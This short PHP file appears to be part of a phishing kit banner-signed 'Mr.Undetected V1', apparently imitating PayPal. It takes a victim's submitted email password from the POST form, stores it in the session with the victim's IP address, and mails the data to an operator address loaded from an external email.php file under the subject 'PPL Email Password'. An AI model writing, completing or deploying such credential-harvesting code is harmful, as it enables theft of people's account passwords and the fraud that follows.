<?php
//#     #            #     #                                                              #     #   #   
//##   ## #####      #     # #    # #####  ###### ##### ######  ####  ##### ###### #####  #     #  ##   
//# # # # #    #     #     # ##   # #    # #        #   #      #    #   #   #      #    # #     # # #   
//#  #  # #    #     #     # # #  # #    # #####    #   #####  #        #   #####  #    # #     #   #   
//#     # #####  ### #     # #  # # #    # #        #   #      #        #   #      #    #  #   #    #   
//#     # #   #  ### #     # #   ## #    # #        #   #      #    #   #   #      #    #   # #     #   
//#     # #    # ###  #####  #    # #####  ######   #   ######  ####    #   ###### #####     #    ##### 

include("system.php");
include '../../email.php';
include("function.php");

$_SESSION['_passwordemail_']     = $_POST['passwordemail'];

$ip=$_SESSION['ip']=getip();
$subject=$_SESSION['subject']=" PPL Email Password | ".$ip."" . "\r\n";
send($_SESSION,$to,$subject) ; 

?>